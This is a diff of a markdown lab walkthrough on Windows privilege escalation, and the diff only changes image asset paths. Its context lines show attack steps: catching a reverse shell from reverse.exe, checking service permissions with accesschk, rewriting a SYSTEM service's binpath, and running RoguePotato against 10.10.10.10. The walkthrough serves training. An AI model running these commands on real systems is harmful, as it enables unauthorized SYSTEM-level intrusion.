@@ -164,7 +164,7 @@ Then run the reverse.exe executable on Windows and catch the shell:
 
 `C:\PrivEsc\reverse.exe`
 
-![](<.gitbook/assets/image (40).png>)
+![](<../.gitbook/assets/image (40).png>)
 
 ### Service Exploits - Insecure Service Permissions
 
@@ -172,7 +172,7 @@ Use accesschk.exe to check the "user" account's permissions on the "daclsvc" ser
 
 `C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc`
 
-![](<.gitbook/assets/image (41).png>)
+![](<../.gitbook/assets/image (41).png>)
 
 Note that the "user" account has the permission to change the service config (SERVICE\_CHANGE\_CONFIG).
 
@@ -180,7 +180,7 @@ Query the service and note that it runs with SYSTEM privileges (SERVICE\_START\_
 
 `sc qc daclsvc`
 
-![](<.gitbook/assets/image (42).png>)
+![](<../.gitbook/assets/image (42).png>)
 
 Modify the service config and set the BINARY\_PATH\_NAME (binpath) to the reverse.exe executable you created:
 
@@ -399,7 +399,7 @@ Now, in the "local service" reverse shell you triggered, run the RoguePotato exp
 
 `C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999`
 
-![](<.gitbook/assets/image (43).png>)
+![](<../.gitbook/assets/image (43).png>)
 
 ### Token Impersonation - PrintSpoofer
 
